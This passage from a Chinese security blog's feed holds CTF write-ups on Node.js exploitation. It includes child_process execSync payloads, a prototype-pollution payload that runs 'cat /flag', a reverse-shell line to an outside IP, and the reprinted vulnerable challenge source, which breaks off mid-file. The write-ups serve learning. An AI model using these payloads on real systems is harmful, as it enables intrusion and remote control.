href="https://www.runoob.com/nodejs/nodejs-tutorial.html">菜鸟教程</a></li><li><a href="https://liaoxuefeng.com/books/javascript/nodejs/">廖雪峰</a></li><li>可以看看，感觉不错，其中具体模块可以看看api文档这些<a href="https://juejin.cn/post/7218117377053098039">系列专栏</a></li><li>其他核心概念：模块、事件驱动架构、异步 I&#x2F;O、流、缓冲区、全局对象、Node.js 运行时、节点包管理器 (npm)、事件循环、中间件和错误处理</li></ol></li><li>具体执行命令<ol><li>官方<a href="https://nodejs.org/api/child_process.html">api文档</a></li><li>看看学过人怎么讲<a href="https://segmentfault.com/a/1190000045261949#item-3-2">child_process</a></li><li><a href="https://blog.csdn.net/cindy647/article/details/108830841">外置模块</a></li><li>可以多查查绕过</li></ol></li><li>nodejs漏洞利用<ol><li><a href="https://hackerqwq.github.io/2021/04/20/nodejs%E5%88%A9%E7%94%A8%E5%B0%8F%E6%80%BB%E7%BB%93/#eval%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">个人博客，很不错的一篇，点很多</a></li><li><a href="https://wiki.scuctf.com/ctfwiki/web/1.nodejs/nodejs/">川大ctf wiki</a></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
            <tag> rce </tag>
            
            <tag> all in one </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow_nodejs</title>
      <link href="/2024/10/30/ctfshow_nodejs/"/>
      <url>/2024/10/30/ctfshow_nodejs/</url>
      
        <content type="html"><![CDATA[<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><ol><li><a href="https://blog.csdn.net/miuzzx/article/details/111780832">csdn挺好，比较全面</a></li><li><a href="https://blog.csdn.net/qq_53263789/article/details/121351854">csdn 还有其他资源</a></li><li><a href="https://hextuff.dev/2022/06/09/ctfshow-web-getting-started-nodejs/#web334">一个和我主题一样的个人博客</a></li></ol><h2 id="web334-看懂nodejs"><a href="#web334-看懂nodejs" class="headerlink" title="web334: 看懂nodejs"></a>web334: 看懂nodejs</h2><ol><li>直接审计代码，无需绕过，看懂即可秒了</li><li>payload: <code>username=ctfshow&amp;password=123456</code></li></ol><h2 id="web335-rce"><a href="#web335-rce" class="headerlink" title="web335: rce"></a>web335: rce</h2><ol><li>提示找不到文件，冥冥中感觉像是文件包含&#x2F;代码执行？注入1直接回显，执行命令有flag，payload<code>require(&quot;child_process&quot;).execSync(&#39;ls&#39;)</code></li><li>官方<code>require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl00g.txt&#39;]).stdout.toString()</code></li></ol><h2 id="web-336"><a href="#web-336" class="headerlink" title="web 336:"></a>web 336:</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ez_Express_CYCTF20</title>
      <link href="/2024/10/30/Ez_Express_CYCTF20/"/>
      <url>/2024/10/30/Ez_Express_CYCTF20/</url>
      
        <content type="html"><![CDATA[<blockquote><p>复现平台: buuoj</p></blockquote><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ol><li>抓包看源码，发现<a href="http://www.zip,阅读发现关键文件index.js/">www.zip，阅读发现关键文件index.js</a><ol><li>用户数据存储在req.session.user中</li><li>流程<ol><li>导航到&#x2F;未登录重定向到&#x2F;login页面，通过res来进行渲染</li><li>结合1要登录admin用户会检查req.session.user的信息是否匹配，又无法获取admin的密码 -&gt; 但是有一个可能，<strong>覆盖</strong>？通过注册实现，但是有安全检查，等下再绕过，看看搞不搞得通<ol><li>思路1<ol><li>登录admin后传<strong>body污染原型链</strong>，原型链只能在登录后进行污染</li><li>获取信息，带外(需要命令执行)&#x2F;回显(难，没法读文件)，这里肯定要读文件，可不可以进行命令执行 -&gt; 通过原型链污染后新建的对象都会有某个属性，将某个属性设置为一个函数，<strong>执行命令</strong>，理论可行，可以执行命令直接看反弹shell，不出网就用回显处理(类似wangding24 web02)</li></ol></li><li>思路1待解决<ol><li>覆盖需要绕过，match()绕过，处理match还对username**进行了什么处理(从处理想对策)**，可能有用？toUpperCase()？<ol><li><a href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">toUpperCase</a>，可以进行绕过，这里node漏洞的</li></ol></li><li>命令执行部分使用shell.js可以一试，需要找到一个对象访问它的属性但是被覆盖 -&gt; 先访问&#x2F;action在访问&#x2F;info有res.outputFunctionName(在&#x2F;目录中的和&#x2F;action中的不一样)，通过<code>&#123;&quot;__proto__&quot;: &#123;&quot;outputFunctionName&quot;: function() &#123;命令执行实现&#125;&#125;</code><ol><li><a href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">nodejs</a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol><h2 id="index-js"><a href="#index-js" class="headerlink" title="index.js"></a>index.js</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">      <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">safeKeyword</span>(<span class="params">keyword</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(keyword.<span class="title function_">match</span>(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>)&#123;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="property">outputFunctionName</span>=<span class="literal">undefined</span>;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;register&quot;</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_">safeKeyword</span>(req.<span class="property">body</span>.<span class="property">userid</span>))&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span>=&#123;</span><br><span class="line">      <span class="string">&#x27;user&#x27;</span>:req.<span class="property">body</span>.<span class="property">userid</span>.<span class="title function_">toUpperCase</span>(),</span><br><span class="line">      <span class="string">&#x27;passwd&#x27;</span>: req.<span class="property">body</span>.<span class="property">pwd</span>,</span><br><span class="line">      <span class="string">&#x27;isLogin&#x27;</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;login&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>==req.<span class="property">body</span>.<span class="property">userid</span>&amp;&amp;req.<span class="property">body</span>.<span class="property">pwd</span>==req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">passwd</span>)&#123;</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">isLogin</span>=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); ;</span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/action&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">data</span> = <span class="title function_">clone</span>(req.<span class="property">body</span>);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/info&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:res.<span class="property">outputFunctionName</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><h2 id="修正"><a href="#修正" class="headerlink" title="*修正"></a>*修正</h2><ol><li>思路没有错就胜利很多了</li><li>fix1: 这里的<strong>访问属性调用函数有问题</strong><ol><li>payload<code>&#123;&quot;lua&quot;:&quot;123&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;t=1;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;).toString()//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</code>这样来调用，插入模板进行调用，反而如果直接定义函数的的话无法被调用</li></ol></li><li>fix2: 注意传输json对象时要<strong>修改content-type: application&#x2F;json</strong></li></ol><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><ol><li>注册<code>admın</code>成功进行覆盖</li><li>访问<code>/action</code>并进行覆盖，payload<code>&#123;&quot;lua&quot;:&quot;123&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;t=1;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;).toString()//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</code></li><li>访问<code>/info</code></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>几个核心思想<ol><li>读文件一般需要命令或者包含</li><li>进行了什么处理(从处理想对策)如uppercase</li><li>这种源码路由题还是先从路由再到细节想思路，不会太跳跃</li></ol></li><li>ref<ol><li><a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">p神的js toUpperCase绕过</a></li><li><a href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">nodejs</a></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> proto pollution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>notes_wangding20</title>
      <link href="/2024/10/30/notes_wangding20/"/>
      <url>/2024/10/30/notes_wangding20/</url>
      
        <content type="html"><![CDATA[<blockquote><p>复现平台: buuoj</p></blockquote><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li>分析源码，目标肯定是&#x2F;status的地方<ol><li><code>let in</code>语句<strong>可以读取原型链的内容</strong>，构造payload<code>&quot;rce&quot;: &quot;ls&quot;</code> –&gt; <strong>需要考虑进行带外，因为是输出到标准输出</strong></li><li>可以考虑构造原型链到Object里，有两个目标<ol><li><p>一个是edit_note</p>   <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// payloads，可以使用反弹shell实现，本地nc -lvnp 8080</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>:<span class="string">&quot;__proto__.b&quot;</span>,</span><br><span class="line">    <span class="string">&quot;author&quot;</span>: <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/8.218.92.67/8080 0&gt;&amp;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;raw&quot;</span> : <span class="string">&quot;h3110 w0r1d&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>一个是write_note</p></li></ol></li></ol></li></ol><h2 id="直接源码"><a href="#直接源码" class="headerlink" title="直接源码"></a>直接源码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">&#x27;undefsafe&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Notes</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">owner</span> = <span class="string">&quot;whoknows&quot;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">num</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">note_list</span> = &#123;&#125;;    <span class="comment">// 定义了一个字典，在后面的攻击过程中会用到</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">write_note</span>(<span class="params">author, raw_note</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">note_list</span>[(<span class="variable language_">this</span>.<span class="property">num</span>++).<span class="title function_">toString</span>()] = &#123;<span class="string">&quot;author&quot;</span>: author,<span class="string">&quot;raw_note&quot;</span>:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">get_note</span>(<span class="params">id</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">        <span class="title function_">undefsafe</span>(r, id, <span class="title function_">undefsafe</span>(<span class="variable language_">this</span>.<span class="property">note_list</span>, id));</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">edit_note</span>(<span class="params">id, author, raw</span>) &#123;</span><br><span class="line">        <span class="title function_">undefsafe</span>(<span class="variable language_">this</span>.<span class="property">note_list</span>, id + <span class="string">&#x27;.author&#x27;</span>, author);</span><br><span class="line">        <span class="title function_">undefsafe</span>(<span class="variable language_">this</span>.<span class="property">note_list</span>, id + <span class="string">&#x27;.raw_note&#x27;</span>, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">get_all_notes</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">note_list</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">remove_note</span>(<span class="params">id</span>) &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="variable language_">this</span>.<span class="property">note_list</span>[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> notes = <span class="keyword">new</span> <span class="title class_">Notes</span>();</span><br><span class="line">notes.<span class="title function_">write_note</span>(<span class="string">&quot;nobody&quot;</span>, <span class="string">&quot;this is nobody&#x27;s first note&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;pug&#x27;</span>);    <span class="comment">// 设置模板引擎为pug</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;Notebook&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/add_note&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&#x27;please use POST to add a note&#x27;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">post</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> author = req.<span class="property">body</span>.<span class="property">author</span>;</span><br><span class="line">        <span class="keyword">let</span> raw = req.<span class="property">body</span>.<span class="property">raw</span>;</span><br><span class="line">        <span class="keyword">if</span> (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.<span class="title function_">write_note</span>(author, raw);</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;add note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;did not add note&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/edit_note&#x27;</span>)    <span class="comment">// 该路由中 undefsafe 三个参数均可控</span></span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to edit a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">post</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.<span class="property">body</span>.<span class="property">id</span>;</span><br><span class="line">        <span class="keyword">let</span> author = req.<span class="property">body</span>.<span class="property">author</span>;</span><br><span class="line">        <span class="keyword">let</span> enote = req.<span class="property">body</span>.<span class="property">raw</span>;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.<span class="title function_">edit_note</span>(id, author, enote);</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/delete_note&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to delete a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">post</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.<span class="property">body</span>.<span class="property">id</span>;</span><br><span class="line">        <span class="keyword">if</span> (id) &#123;</span><br><span class="line">            notes.<span class="title function_">remove_note</span>(id);</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;delete done&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;delete failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/notes&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> q = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">        <span class="keyword">let</span> a_note;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">typeof</span>(q) === <span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">            a_note = notes.<span class="title function_">get_all_notes</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a_note = notes.<span class="title function_">get_note</span>(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;note&#x27;</span>, &#123;<span class="attr">list</span>: a_note&#125;);</span><br><span class="line">    